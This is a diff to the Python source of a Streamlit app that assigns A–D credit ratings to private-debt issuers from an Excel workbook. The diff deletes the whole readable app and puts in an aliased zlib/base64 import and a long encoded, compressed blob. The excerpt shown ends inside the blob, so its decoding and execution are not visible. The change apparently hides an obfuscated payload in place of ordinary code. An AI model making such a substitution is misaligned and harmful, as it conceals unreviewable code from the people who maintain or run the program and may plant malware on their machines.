@@ -1,511 +1,60 @@
-# -*- coding: utf-8 -*-
-"""
-Notation AFRICAPITAL des émetteurs de dette privée
----------------------------------------------------
-Application Streamlit : lit le fichier Liste_Emetteurs.xlsx (feuilles
-"Feuil1", "financier", "corporate"), calcule les 3 ratios par famille
-d'émetteur, convertit chaque ratio en note (A/B/C/D), calcule la note
-globale (moyenne des points A=4, B=3, C=2, D=1) et affiche le résultat.
-
-Lancement :  streamlit run app.py
-"""
-
-import io
-from pathlib import Path
-
-import pandas as pd
-import streamlit as st
-
-# ----------------------------------------------------------------------------
-# Configuration générale
-# ----------------------------------------------------------------------------
-
-st.set_page_config(
-    page_title="Notation Émetteurs — Dette Privée",
-    page_icon="📊",
-    layout="wide",
-)
-
-NAVY = "#1F2A44"
-GOLD = "#C9A227"
-
-RATING_META = {
-    "A": {"color": "#16A34A", "bg": "#F0FDF4", "border": "#86EFAC", "label": "Qualité de crédit forte"},
-    "B": {"color": "#2563EB", "bg": "#EFF6FF", "border": "#93C5FD", "label": "Qualité de crédit satisfaisante"},
-    "C": {"color": "#D97706", "bg": "#FFFBEB", "border": "#FCD34D", "label": "Sous surveillance"},
-    "D": {"color": "#DC2626", "bg": "#FEF2F2", "border": "#FCA5A5", "label": "Qualité de crédit dégradée"},
-    "N/A": {"color": "#6B7280", "bg": "#F9FAFB", "border": "#D1D5DB", "label": "Données non disponibles"},
-}
-
-POINTS = {"A": 4, "B": 3, "C": 2, "D": 1}
-
-st.markdown(
-    f"""
-    <style>
-      .block-container {{ padding-top: 2rem; }}
-      .acm-title {{
-          text-align: center; font-size: 2.3rem; font-weight: 800;
-          color: {NAVY}; margin-bottom: .2rem;
-      }}
-      .acm-issuer {{ font-size: 1.6rem; font-weight: 700; color: #111827; }}
-      .acm-badge {{
-          display: inline-block; padding: 2px 10px; border-radius: 8px;
-          background: #FEE2E2; color: #B91C1C; font-size: .85rem; font-weight: 600;
-          margin-right: 8px;
-      }}
-      .acm-sector {{ color: #4B5563; font-size: .9rem; }}
-      .rating-card {{
-          border-radius: 12px; padding: 14px 30px; text-align: center;
-          border: 2px solid; min-width: 190px;
-      }}
-      .rating-letter {{ font-size: 2.2rem; font-weight: 800; line-height: 1.1; }}
-      .rating-label {{ font-size: .75rem; color: #374151; }}
-      .kpi-label {{ color: #374151; font-size: .9rem; margin-bottom: .1rem; }}
-      .kpi-value {{ font-size: 2rem; font-weight: 700; color: #111827; }}
-      .kpi-note {{ font-size: .8rem; font-weight: 700; }}
-      hr {{ margin: 1.2rem 0; }}
-    </style>
-    """,
-    unsafe_allow_html=True,
-)
-
-# ----------------------------------------------------------------------------
-# Moteur de notation (conforme au PDF « Méthodologie Notation AFRICAPITAL »)
-# ----------------------------------------------------------------------------
-
-def note_solvabilite(x):
-    """Fonds propres / total actif (proxy du ratio réglementaire)."""
-    if x is None: return "N/A"
-    return "A" if x >= 0.10 else "B" if x >= 0.08 else "C" if x >= 0.06 else "D"
-
-def note_exigible_pnb(x):
-    """Total exigible / PNB — un levier faible est meilleur (PDF : ≤20x = A)."""
-    if x is None: return "N/A"
-    return "A" if x <= 20 else "B" if x <= 30 else "C" if x <= 40 else "D"
-
-def note_marge_intermediation(x):
-    """Produits d'intérêts / Charges d'intérêts."""
-    if x is None: return "N/A"
-    return "A" if x >= 2.5 else "B" if x >= 2 else "C" if x >= 1.5 else "D"
-
-def note_gearing(x):
-    """Dette nette / Fonds propres."""
-    if x is None: return "N/A"
-    return "A" if x <= 0.5 else "B" if x <= 0.7 else "C" if x <= 0.9 else "D"
-
-def note_dn_ebitda(x):
-    """Dette nette / EBITDA (années de désendettement)."""
-    if x is None: return "N/A"
-    return "A" if x <= 1 else "B" if x <= 2 else "C" if x <= 4 else "D"
-
-def note_couverture(x):
-    """EBITDA / Frais financiers."""
-    if x is None: return "N/A"
-    return "A" if x >= 15 else "B" if x >= 10 else "C" if x >= 5 else "D"
-
-def note_globale(notes):
-    """Moyenne des points (A=4 … D=1) reconvertie en lettre."""
-    pts = [POINTS[n] for n in notes if n in POINTS]
-    if len(pts) < 3:
-        return None, "N/A"
-    m = sum(pts) / len(pts)
-    lettre = "A" if m >= 3.5 else "B" if m >= 2.5 else "C" if m >= 1.5 else "D"
-    return round(m, 2), lettre
-
-def _num(v):
-    """Convertit une cellule en float, None si vide/non numérique."""
-    if v is None or (isinstance(v, str) and not v.strip()):
-        return None
-    try:
-        f = float(v)
-        return None if f != f else f  # exclut les NaN
-    except (TypeError, ValueError):
-        return None
-
-def _div(a, b):
-    if a is None or b in (None, 0):
-        return None
-    return a / b
-
-# ----------------------------------------------------------------------------
-# Lecture robuste du fichier Excel — s'adapte à différentes mises en forme
-# (nom des feuilles, ligne d'en-tête, ordre/orthographe des colonnes)
-# ----------------------------------------------------------------------------
-
-import re
-import unicodedata
-
-
-def _norm(s):
-    """Normalise un libellé : sans accents, minuscules, espaces compactés."""
-    if s is None:
-        return ""
-    s = unicodedata.normalize("NFKD", str(s)).encode("ascii", "ignore").decode("ascii")
-    s = s.lower().strip()
-    s = re.sub(r"[’']", "'", s)
-    s = re.sub(r"\s+", " ", s)
-    return s
-
-
-# Alias possibles pour chaque champ requis (on matche par normalisation)
-ALIASES = {
-    "societes":              ["societes", "societe", "emetteur", "emetteurs"],
-    "capitaux_propres":      ["capitaux propres", "capitaux propre"],
-    "total_actif":           ["total actif", "total actifs"],
-    "dettes_subordonnees":   ["dettes subordonnees", "dette subordonnee"],
-    "etablissements_credit": ["etablissements de credits", "etablissement de credit", "etablissements de credit"],
-    "dettes_clientele":      ["dettes envers la clientele", "dette envers la clientele"],
-    "autres_dettes_titre":   ["autre dettes representees par un titre", "autres dettes representees par un titre"],
-    "pnb":                   ["produit net bancaire", "pnb"],
-    "produits_interet":      ["produits d'interet", "produit d'interet"],
-    "charges_interet":       ["charges d'interets", "charge d'interets", "charges d'interet"],
-    "dette_nette":           ["dette nette"],
-    "resultat_exploitation": ["resultat d'exploitation", "resultat dexploitation"],
-    "ebitda":                ["ebitda"],
-    "frais_financiers":      ["charges d'interet (frais financiers)", "frais financiers",
-                              "charges d'interets (frais financiers)"],
-    "type":                  ["type"],
-    "secteur":               ["secteur"],
-}
-
-
-def _map_columns(columns):
-    """Associe chaque clé canonique (ALIASES) à son nom de colonne réel, si présent."""
-    norm_map = {c: _norm(c) for c in columns}
-    mapping = {}
-    for key, aliases in ALIASES.items():
-        aliases_norm = {_norm(a) for a in aliases}
-        for orig, norm in norm_map.items():
-            if norm in aliases_norm:
-                mapping[key] = orig
-                break
-    return mapping
-
-
-def _detect_header_row(ws, max_scan=5):
-    """Trouve la ligne (1-indexée) contenant l'en-tête 'Societes'/'Emetteur'."""
-    societes_aliases = {_norm(a) for a in ALIASES["societes"]}
-    for r in range(1, max_scan + 1):
-        for cell in ws[r]:
-            if _norm(cell.value) in societes_aliases:
-                return r
-    return 1  # repli : première ligne
-
-
-def _find_sheet(sheetnames, keywords):
-    """Trouve la première feuille dont le nom normalisé contient un des mots-clés."""
-    for name in sheetnames:
-        n = _norm(name)
-        if any(k in n for k in keywords):
-            return name
-    return None
-
-
-@st.cache_data(show_spinner=False)
-def charger_donnees(contenu: bytes):
-    import openpyxl
-
-    wb = openpyxl.load_workbook(io.BytesIO(contenu), read_only=True, data_only=True)
-    sheetnames = wb.sheetnames
-
-    sheet_fin = _find_sheet(sheetnames, ["financ"])
-    sheet_corp = _find_sheet(sheetnames, ["corporate", "corpo"])
-    sheet_univers = _find_sheet(sheetnames, ["feuil1", "univers", "liste"])
-
-    if sheet_fin is None or sheet_corp is None:
-        raise ValueError(
-            "Impossible de repérer les feuilles 'financier' et 'corporate' dans ce fichier. "
-            f"Feuilles trouvées : {sheetnames}"
-        )
-
-    xls = pd.ExcelFile(io.BytesIO(contenu))
-
-    # --- Univers (optionnel) ----------------------------------------------
-    univers = None
-    if sheet_univers is not None:
-        header_u = _detect_header_row(wb[sheet_univers])
-        raw_u = pd.read_excel(xls, sheet_univers, header=header_u - 1)
-        raw_u.columns = [str(c).strip() for c in raw_u.columns]
-        cmap_u = _map_columns(raw_u.columns)
-        if "societes" in cmap_u:
-            univers = pd.DataFrame({
-                "Emetteur": raw_u[cmap_u["societes"]].astype(str).str.strip(),
-                "Type": raw_u[cmap_u["type"]] if "type" in cmap_u else None,
-                "Secteur": raw_u[cmap_u["secteur"]] if "secteur" in cmap_u else None,
-            }).dropna(subset=["Emetteur"])
-            univers = univers[univers["Emetteur"].str.len() > 0]
-
-    # --- Sociétés financières ----------------------------------------------
-    header_f = _detect_header_row(wb[sheet_fin])
-    fin_raw = pd.read_excel(xls, sheet_fin, header=header_f - 1)
-    fin_raw.columns = [str(c).strip() for c in fin_raw.columns]
-    fin_raw = fin_raw.loc[:, ~fin_raw.columns.str.startswith("Unnamed")]
-    cmap_f = _map_columns(fin_raw.columns)
-
-    def g(row, key):
-        col = cmap_f.get(key)
-        return _num(row.get(col)) if col else None
-
-    fin_rows = []
-    for _, r in fin_raw.iterrows():
-        nom = r.get(cmap_f.get("societes"))
-        if not isinstance(nom, str) or not nom.strip():
-            continue
-        cp   = g(r, "capitaux_propres")
-        ta   = g(r, "total_actif")
-        dsub = g(r, "dettes_subordonnees")
-        ec   = g(r, "etablissements_credit")
-        dcl  = g(r, "dettes_clientele")
-        adt  = g(r, "autres_dettes_titre")
-        pnb  = g(r, "pnb")
-        pi   = g(r, "produits_interet")
-        ci   = g(r, "charges_interet")
-
-        exigible = None
-        parts = [dsub, ec, dcl, adt]
-        if any(p is not None for p in parts):
-            exigible = sum(p for p in parts if p is not None)
-
-        r1 = _div(cp, ta)          # ratio de solvabilité (proxy)
-        r2 = _div(exigible, pnb)   # total exigible / PNB
-        r3 = _div(pi, ci)          # produits / charges d'intérêts
-
-        n1, n2, n3 = note_solvabilite(r1), note_exigible_pnb(r2), note_marge_intermediation(r3)
-        moy, lettre = note_globale([n1, n2, n3])
-
-        fin_rows.append({
-            "Emetteur": nom.strip(), "Famille": "Société financière",
-            "Ratio 1": r1, "Ratio 2": r2, "Ratio 3": r3,
-            "Note 1": n1, "Note 2": n2, "Note 3": n3,
-            "Score": moy, "Note finale": lettre,
-        })
-    df_fin = pd.DataFrame(fin_rows)
-
-    # --- Corporates ----------------------------------------------------------
-    header_c = _detect_header_row(wb[sheet_corp])
-    corp_raw = pd.read_excel(xls, sheet_corp, header=header_c - 1)
-    corp_raw.columns = [str(c).strip() for c in corp_raw.columns]
-    corp_raw = corp_raw.loc[:, ~corp_raw.columns.str.startswith("Unnamed")]
-    cmap_c = _map_columns(corp_raw.columns)
-
-    def gc(row, key):
-        col = cmap_c.get(key)
-        return _num(row.get(col)) if col else None
-
-    corp_rows = []
-    for _, r in corp_raw.iterrows():
-        nom = r.get(cmap_c.get("societes"))
-        if not isinstance(nom, str) or not nom.strip():
-            continue
-        cp     = gc(r, "capitaux_propres")
-        dn     = gc(r, "dette_nette")
-        rex    = gc(r, "resultat_exploitation")
-        ebitda = gc(r, "ebitda")
-        ff     = gc(r, "frais_financiers")
-
-        # EBITDA de repli : résultat d'exploitation si l'EBITDA manque
-        if ebitda is None:
-            ebitda = rex
-
-        r1 = _div(dn, cp)        # gearing
-        r2 = _div(dn, ebitda)    # dette nette / EBITDA
-        r3 = _div(ebitda, ff)    # EBITDA / frais financiers
-
-        n1, n2, n3 = note_gearing(r1), note_dn_ebitda(r2), note_couverture(r3)
-        moy, lettre = note_globale([n1, n2, n3])
-
-        corp_rows.append({
-            "Emetteur": nom.strip(), "Famille": "Corporate",
-            "Ratio 1": r1, "Ratio 2": r2, "Ratio 3": r3,
-            "Note 1": n1, "Note 2": n2, "Note 3": n3,
-            "Score": moy, "Note finale": lettre,
-        })
-    df_corp = pd.DataFrame(corp_rows)
-
-    # --- Univers de repli : si aucune feuille Type/Secteur n'existe --------
-    if univers is None:
-        combo = pd.concat([df_fin[["Emetteur", "Famille"]], df_corp[["Emetteur", "Famille"]]], ignore_index=True)
-        univers = pd.DataFrame({
-            "Emetteur": combo["Emetteur"],
-            "Type": combo["Famille"],
-            "Secteur": "—",
-        })
-
-    return univers, df_fin, df_corp
-
-
-# Libellés des indicateurs par famille
-LIBELLES = {
-    "Société financière": [
-        ("Ratio de solvabilité", "pct"),
-        ("Total exigible / PNB", "x"),
-        ("Produits d'intérêts / Charges d'intérêts", "x"),
-    ],
-    "Corporate": [
-        ("Gearing (Dette nette / Fonds propres)", "x"),
-        ("Dette nette / EBITDA", "x"),
-        ("EBITDA / Frais financiers", "x"),
-    ],
-}
-
-def fmt(v, kind):
-    if v is None or pd.isna(v):
-        return "—"
-    if kind == "pct":
-        return f"{v * 100:.1f}%".replace(".", ",")
-    return f"{v:.1f}x".replace(".", ",")
-
-# ----------------------------------------------------------------------------
-# Interface
-# ----------------------------------------------------------------------------
-
-with st.sidebar:
-    st.header("Sélection")
-    fichier = st.file_uploader("Fichier Excel des émetteurs", type=["xlsx"])
-
-NOMS_PAR_DEFAUT = ["Data-Emetteurs.xlsx", "Liste_Emetteurs.xlsx"]
-defaut = next((Path(__file__).parent / n for n in NOMS_PAR_DEFAUT if (Path(__file__).parent / n).exists()), None)
-
-if fichier is not None:
-    contenu = fichier.getvalue()
-elif defaut is not None:
-    contenu = defaut.read_bytes()
-else:
-    st.info("Charge un fichier Excel des émetteurs dans la barre latérale pour commencer.")
-    st.stop()
-
-try:
-    univers, df_fin, df_corp = charger_donnees(contenu)
-except ValueError as e:
-    st.error(str(e))
-    st.stop()
-resultats = pd.concat([df_fin, df_corp], ignore_index=True)
-
-# Jointure avec l'univers pour récupérer Type et Secteur
-univers_idx = univers.set_index(univers["Emetteur"].str.upper().str.strip())
-
-def info_univers(nom):
-    key = nom.upper().strip()
-    # correspondance exacte puis partielle (ex. "CIH" vs "CIH Bank")
-    if key in univers_idx.index:
-        row = univers_idx.loc[key]
-    else:
-        match = univers_idx[univers_idx.index.str.contains(key, regex=False)]
-        if match.empty:
-            return "—", "—"
-        row = match.iloc[0]
-    if isinstance(row, pd.DataFrame):
-        row = row.iloc[0]
-    return row.get("Type", "—"), row.get("Secteur", "—")
-
-resultats[["Type", "Secteur"]] = resultats["Emetteur"].apply(
-    lambda n: pd.Series(info_univers(n))
-)
-
-with st.sidebar:
-    types_dispo = sorted(univers["Type"].dropna().unique().tolist())
-    types_sel = st.multiselect("Type d'émetteur", types_dispo, default=types_dispo)
-
-    dispo = resultats[resultats["Type"].isin(types_sel)] if types_sel else resultats
-    notes_ok = dispo[dispo["Note finale"] != "N/A"]
-    choix = notes_ok["Emetteur"].tolist() or dispo["Emetteur"].tolist()
-    emetteur = st.selectbox("Émetteur", choix) if choix else None
-
-st.markdown('<div class="acm-title">Notation AFRICAPITAL des émetteurs de dette privée</div>', unsafe_allow_html=True)
-st.markdown("---")
-
-if emetteur is None:
-    st.warning("Aucun émetteur disponible pour cette sélection.")
-    st.stop()
-
-ligne = resultats[resultats["Emetteur"] == emetteur].iloc[0]
-note = ligne["Note finale"] if pd.notna(ligne["Note finale"]) else "N/A"
-meta = RATING_META[note]
-
-# --- En-tête émetteur + carte de notation -----------------------------------
-c1, c2 = st.columns([3, 1])
-with c1:
-    st.markdown(f'<div class="acm-issuer">{emetteur}</div>', unsafe_allow_html=True)
-    st.markdown(
-        f'<span class="acm-badge">{ligne["Type"]}</span>'
-        f'<span class="acm-sector">Secteur : {ligne["Secteur"]}</span>',
-        unsafe_allow_html=True,
-    )
-with c2:
-    st.markdown(
-        f"""
-        <div class="rating-card" style="background:{meta['bg']}; border-color:{meta['border']};">
-          <div class="rating-letter" style="color:{meta['color']};">{note}</div>
-          <div class="rating-label">{meta['label']}</div>
-        </div>
-        """,
-        unsafe_allow_html=True,
-    )
-
-if ligne["Score"] is not None and pd.notna(ligne["Score"]):
-    st.caption(f"Score moyen : {str(ligne['Score']).replace('.', ',')} / 4")
-
-# --- Indicateurs clés --------------------------------------------------------
-st.markdown("### Indicateurs clés")
-libelles = LIBELLES[ligne["Famille"]]
-fmt1 = "pct" if ligne["Famille"] == "Société financière" else libelles[0][1]
-
-cols = st.columns(3)
-for col, (lib, kind), rk, nk in zip(
-    cols, libelles, ["Ratio 1", "Ratio 2", "Ratio 3"], ["Note 1", "Note 2", "Note 3"]
-):
-    n = ligne[nk]
-    couleur = RATING_META.get(n, RATING_META["N/A"])["color"]
-    with col:
-        st.markdown(
-            f"""
-            <div class="kpi-label">{lib}</div>
-            <div class="kpi-value">{fmt(ligne[rk], kind)}</div>
-            <div class="kpi-note" style="color:{couleur};">Note : {n}</div>
-            """,
-            unsafe_allow_html=True,
-        )
-
-st.markdown("---")
-
-# --- Univers des émetteurs notés --------------------------------------------
-st.markdown("### Univers des émetteurs notés")
-
-tableau = resultats[resultats["Note finale"] != "N/A"][
-    ["Emetteur", "Type", "Secteur", "Note 1", "Note 2", "Note 3", "Score", "Note finale"]
-].rename(columns={"Emetteur": "Émetteur", "Note finale": "Note"})
-
-def couleur_note(v):
-    meta = RATING_META.get(v)
-    if meta:
-        return f"color:{meta['color']}; font-weight:700;"
-    return ""
-
-st.dataframe(
-    tableau.style.map(couleur_note, subset=["Note 1", "Note 2", "Note 3", "Note"]),
-    use_container_width=True,
-    hide_index=True,
-)
-
-# --- Export Excel ------------------------------------------------------------
-buffer = io.BytesIO()
-export = resultats[resultats["Note finale"] != "N/A"].copy()
-with pd.ExcelWriter(buffer, engine="xlsxwriter") as writer:
-    export.to_excel(writer, sheet_name="Notation", index=False)
-    wb, ws = writer.book, writer.sheets["Notation"]
-    header_fmt = wb.add_format({"bold": True, "bg_color": NAVY, "font_color": "white", "border": 1})
-    for i, col in enumerate(export.columns):
-        ws.write(0, i, col, header_fmt)
-        ws.set_column(i, i, max(14, len(str(col)) + 2))
-
-st.download_button(
-    "📥 Exporter la notation (Excel)",
-    data=buffer.getvalue(),
-    file_name="Notation_AFRICAPITAL.xlsx",
-    mime="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
-)
-
-st.caption(
-    "Modèle d'aide à la décision — ne se substitue ni à l'analyse fondamentale "
-    "ni aux éléments qualitatifs (gouvernance, actionnariat, position concurrentielle)."
-)
+import zlib as _z,base64 as _b
+_=("""c-oy>-E!NwlD>|ff=5$ZAa`KKlI<jxg49BPw&VObasD|f6(vFvV~UhX%9i8u*10|BcK2qlc5k-oWM9K?a-LuxVZR0`>c`GZ&Ss_(5NI^I8;$O-0m)B-
+y^2yd^`nrL<VV47|1wc&s%9}hKM2;0;%OASslw-b!G^KxC%vH`y5YcAaf04=g2gJC1z^%s^Jx(I1-
+nzhJYv=h>2Gwr6>Kne<B>{weweCQrRaPk*ffs3nV+uqo(Sg7QgH5R7D+Gl@r8lcIn$&!2z&+lfO=mErc$>b_(`HB=*4KPJfAqdEG8tgeiVCA7%D}QzYr{i?m
+^ETr2Y^cJCI~RQ>vol28k-kieRVFz`y;T-hMZ7wQv8X<=7VNEh%d3u+q0hyUI#ei*|*T=8&rIr=H77m*5@tS?K~MaHp`*Y~F*~)0jk=i4SftQ|&m8;!-
+LC6_(BfOVl9Sh_4XzYKldD;U|8Wq!2@uJi+FyG|(HUNQ!>mgb;4tgbber`}?2&ot3cDr-
+O(@$1a~PSYwL=x32<L!tVA*tb{%5xD!7ht75wnXs=R|5!*!8Q<#Lkd8g&UUJRljLf5N&L9!7|h0$BA1PeD==~%D^D?JxXveJ=A(zw(S@8X#%wK3@-
+I$MIZmtH4cMWHJB6Zl<f_)%#XM-yY}rsKfx8+rE$J{KfYH}u@Z!2eAS=E|J}eoCK>Qo~ME+MBu~)f+_N&>xw)4Oa@(((#SL=Mw{_GFtRuoW%ac?RUkvp5kM^
+VE_A{|MpkL1NSPLrGj1ho?=!>?h5uxrBju=yO6$zkLJFtRv)vH64%db*RN|Bek6BxCFAeW?re8jon6M?p#9`gyCa*7f2grHGZ%8h%{*lc;@j_VUSkOT6uaTa
+8JFtbqn&mm<I?VQ9(6hym;IgQUZ?d#E(x?uhB&xxsJXq!xV82lKi+<n%hc&Kh%<5PG+R5n8Mo7DmKez_zEE%oayra@na^%kA5|B#+ns8sx|l8Z<lYZu@ovA5
+V%H<X-tczD>QUoy^~rY5YQG~pxgf1dYp>PNtXep<n3EVGw#)OAX%zbX0B(76Q<8gR=3N+R2dY&eVC4ooKXKzTFS-oPVYyr`8Tj)wNv{I+Ot%fg?g!D}YzzCE
+x_+o)<N6w|<avHL+DfBo&8Ws|Qa7+bPVWvTTiSC#nfKA3RL#>ZC^`yj#(?5cT*tnJ=~m)@Q{ZCnXg<2@Qu(8CS~H$(Z`W5?=rdF^uI27c-
+GJO9Kiuj^X&OyxhONcOiPwcetea(WudG+GAKhK=G1gnG@=K*sc~X76safCkMjM)uo#E>>!w&;kXiFQczAzG0o6e2O_H<r1vcRx~jrC^<)I;A2pT0Xd8^zHq^
+ssuT-LAH)OKBSWm1d>6W-|N9-dz<Qt(z>jQk>g!x!}516hb3yqQ!c<jXj*A_4W2Qb{hGPykOwQ-nvCL^sH1#`NAHRT^M9X8{{6RxWgthU=jtshh2v<h$rb7Z
+1%VBQzsWHpy0H*>DA0j?mC&FH*TEwRP4$<YU=pE!O(u3ZNb87JCAoOdux-
+=rv7r~CfQx%ZhCcP!{o&7f^y)dX8*7=6Q__;(S}A(e!!`iIo4Lq1SMP1(#DeD>BE)qfsn#yVd4%|&kcg;vNujAf#_HzPYn(E*_>Oo(gS~J%nd&=WDSsJ7KcW
+=^dN6NH)!yguq%cF&@he{-`h{Jju%D8qpag)#`?=ovVJP6+pDafik<CM&QHbe_8MdNr)93%d+S11*F~-
+@#&gd7pB8zYF}@$Ki)`<&F&_Lh<H|bU>V_rOxOzWrh{}c?D%<OZSU1BXle{t^-c8}iJx6wt-VKT9YUmM~rN87}SFfL%P3!5-VtvUWK|>_73A!KBSiL2*D2-
+=gXU%ktl}&n)cPw|Mo-
+@=D*=+Et#ao$(kIjo*^$V@K0r`CMf*)CcSR|xzVFO|LQ`5?&Dm_T!t6D=0gUC%Wd%;`kRsSR!*_w^g12rG0X=)N~)G(LN3LdofJJaR;d~vr}9C$A@CEs2ym-
+BZY_80IkRyc`(XP)xh)Fs>}m1g<H)W&Y0kVpo;&ou93bx#@k5+RixM)3sE`kOM@tIjd7&k^QYwhD<YOvDh#2|8Q0r?M`qo`}T8$yc#yEsTP`SlOsD%(C<MKm
+P~omU)?#d9pIVe)}!?m2qY;>dv)EO7e-gep_?i@&(`qiCRG7Wiw%2eo=FZ3c^@a5PY)>gz^O_b%A4K1rA^RB3AMxD6-nfSgVbA*1OtC<gY-
+!US(y_jtVWBv^KUJ+8kM#MO<Gmg;3!Iib^AJjb&}OkmbHH%s#<vT__qkk64jKhyWi`H#TOWk=2eouPFbRvdb^QHm^zzRIk7=;lTBY$t4zjQ*+9Tn$_@FUbSM
+k7gLsfpvK0Q^Rjn2kbpYtyss}==Wx0(k&#u>=z0gHi@F=ctCe?|v*pNIN#5o2nls1j_xFipn7X_-
+mgT(#R-1k79vPGSrgr()n)9{G&uY$D_eLMdz(n4jO~U+OUd!4SQ(8qB%m;7kQe5AZ9-!ZB@|Hy*@rmuHYLb{V@j+W$ugz<LSW|cS0Z}(riRsiI5LLS-on}{b
+>V4FRXGJKHTC$0Gned4_?<E5_6nnXRYpcj7&f9J#R@M=_;YgX4V%o12y&#P@Y5X!lj9-ZG#cbLd;AjDhpk9bk(PD&VGFB=L-
+HA&0nYy~f@zcgC7F~`L=Y}8=OL_%2yfQUO!zieiEQ$sHrC|@;!C3VuTw*zZmt^YWh{r-
+!a{x0msVq|AjFy%i!QO|oq{r%c(2b@loL<cX9c~ZmLm>|k3|+5>)z11+bY}XI-MGRjJ9=I4;;_5di^AYabU3Y^x2^g}4DF?2^+<%~h&wFvCf2p;)4XR;Tu1S
+&O@rqPay9dV3Pz9*F0`jI#2h*<mX7^Vkyoa97J$ntV}=Ux2x=t>m6Q~l5EyR1$3WSrFb&O>8mw?`X5g@_$YOYIm;mR){Rd-
+=+eT+GDMgmO(3LCdyU|S<lEk8Ew~-BljvuJ|>}1ssgwztBlbn=yC2h7m6ccmkoI~Xo;GwNaX*Dooe$L1Eq&+;`s$ksC&ysMC;2?_xRrp0Q-
+mSkBfmwX!uJo2@Ue*q<N(=kciLou_b*uKmd5JU7wcUj7qs$}Cc)^^X=<%=JE;xME9J1^$`A0o+rbo_JM{bZ&k*`8H;;f&jR5-0Jsej-cpryG7Dm1NU+kiy!N
+b4Vg;&4;{sL=n2^gsLq{STM=ABsb`?!c+>e=T}*wcI#OF8y?D%8u2o%N<ziaK%z|RN7`7UD8RlfP&<XJyNMjUj-
+0)Oa!{SVOa!<a?PR6u5h|pl<V<^rKLjL0yw(NL)UZB&@*$sZ>@ZL$Rm97IdB>Dp^xVUEF&NC!<hnMBHDm1z-
+02dZpjyD9%s#$XnxF^uh9IIHD9BtvgQezL*2YYYm{}qL35ln-
+=euEWF5f8k;hzq<nj}js=EwDjly?zIBH}e)T&_`Vc5oMuSSanJ!$z`yfYInpIh}eXvsY;hgSVPHAh^It@;Q4g?j>()@zHSD0+jxUGu$FPr0lLU~NYez*FR|?
+M@M`Jo4YdPW-ecEBvbVnt!Xk;c~n7p1ZXVykGmm2Q`m>s-^r@O;&Fpirim21#%ZWeeH--us_~(#A)G(J~`s?A2{Oi(h-lv@xl?0f8P-
+$9PxO=5!IR_%74fa8=H=J{3Az{|361mxg$1pOP-
+?nHEX`J>SNuSqwg&1d!KV3XHj}A<k#FIWRp<yo2)g?9AeDnS>X?T?GFR(58nO$(D;!*eE3O!Xs!E0BTFs^nXs~rQRqHEIpoNF$7%7?E&x|6Z*_TAO7#2?(2R
+25oggdQ2z>~q`1iDn(D|8G&3EyD%Y85_;Y41`O3g9zw+1AwBnmFvzOQdw8J9a2H`zOl_to4V>D2bnIC<4z+`~}$WDUL|-
+QE5VJ{}s)Rcx1cmoWu8e4zCXlpFiu$S_+=Jc?<ZDD;v=IbvmNuyvAl<LF&W=0n*BO}qmyu~vo_<ruZ+84Pu&C~ew)f}C+tz?#pRfM^Ax@S=BEzP|Y9%Jz26t
+_*Mfsf>d<4cq~WJR8t}v!z*yP!rAXA)<o^NSXMa>br5RVP^;2WT&^^12xdV8h*8pGcrU*@6D!!govP%!2v^Od+bqS+<q@AIZi25IBXsyb3!NxDh?w@*jl`WB
+(@&o>;<8i-bQz~gg6kYd1{*U8e;Z(di9=Vqm)5W^H45fp!5-8e?*2lca8;c)NyF665T@VFL4KggWRW6ufeNnl~h0!a-
+BkEL9kCqM$;q;hVsK<WU|bosJI&bjy*CAh3XDAMllz-<a{oib{frMR0b1Njsrj|m>PSLMmV%3x_gMY{E7%5fLZA%X4eeHOas#ZGEf+cO~l^7TA6vUdP-
+^jopV_lib%g6=?*hmz>yh(M_%$Tf=3RTCuSH;vcdt4RYD@t4yx1L(AF$#5}=pjeFL#q8w^3NC5BEuu2;xkClZ9kSdAbUAbOr-Teg}^)2reH@XrJhMa%Yy>2`
+L7<eQSOgcoFAA(sS;)S!d<3IB}!*UgV;mJS@}gn#UIg+^kCnZcDAxRbu;8ey$zpQ_l$UX#|Ab?1;E(kJwG<-u?#-
+37+8Y#{S<@*+Ep2%5uob;Q$#Jwde!EKbMCEYlqk;!oilWsYbM6T2W1vPsnd;Y0AH*HBZoEW(wtl_j);x(vnCnL4k!e-dqE%eIgqsjyg*@c-
+&J>IZr!q_z9e+$1Q|rUWV5iwwE)n8coX{)I6J+$0g@;zg+ZtawY5owr9#d2;klzPRJz`5gtqq<&g_`VhRHvHLHQSJ&Ly+G6@(o@Ys>VPCp&h$w6_IUC?$6^p
+FAjpYX?yT>Ua)!O+v%yG65=iS09Q0^VVc37=x<A7t^=+n}sXqQGpIkE#PoVzLPmV*$}+2NIL?glcdtv<iqF<JI*RepATe)D@KsIN0grf#^(ML$@9$srs8d}#
+RD9ir_0r~E8`@1`Q`(D_)<|G@T{7SnYt7%N_IRux)#D=HiMg+P>79=xtc&in37@j{k8TcGm|I?K;i-h}SqnLYIsT#LD{_1tUO$<6l%T<DPo<Rj-pcXPtVCv?
+2uAaI65=To-;^mHA(^o~zmU`~7BPRYSgOzWQ+7?bEqg=FxfjHF1cWxLGrpLK)mzgu4S^k07Y#W)H*AAwmPnL%*-
+J)t*tRKz3a5P+y#YHTCL8(O4OxUS4E_vHb+*QvlY&sY3%2Z0>%f6Pr8bD1E*0TIp!<9<U_mgig^aOaAD1Lo^;$K`!K=;})kl!cC*A$(j2m0{mQuAFw)g854i
+w1<q>9ptyrFz(-p;;oE!EzURL_sMm(CGs(>C(|y;{!<g_DPhxP<OMm5{(T0$G9TW{=%?e*=6=1;Zd*2^9R$hu?ox-DEF2RIMq1(8()<&D)$PJD=-Ov-
+H7E!Ie+1mtKPX{0d3K#=Zxb@#jf*Uy$|clW=&Fy$+B+XT^OYCb4#&7*)8*4JgYTENwiR@OJIwjw8X}V~6QOJIS)zYIlKoPkrypuXhmVo%mViMXiIvM7d_P~&
+8xA?WGV{=q-~W7!sme0t5m(^|jD^O6m%5i(05CBr{2Ym@s4n#-S&z&mP;X~T0}|Bb6-
+Q|w+jRBD<LoXiapWiX?>8Z@Y}fO8Lwe*$&1=?=0*}=?ob^Y&?B_c*xyu=uZ1K%5$39)My{T2G`k*6}py0x>QQ>T&=+?`GWW{Z+Jhrvm<~9c%m*42BLBpqv1h
+e(^s#)3PDbU#1vVN^v<V)m7`sT1dOH+go`i;$h10m8iBi+Ec<Vaa+HMP~KxWM)ad9;E`xdye`F2&D!dMl|oN756Y2nfqigaOUNi_o*_GIKr&GW#T3(GWOQdC
+_1-j}>+@C1|THIten%>O-
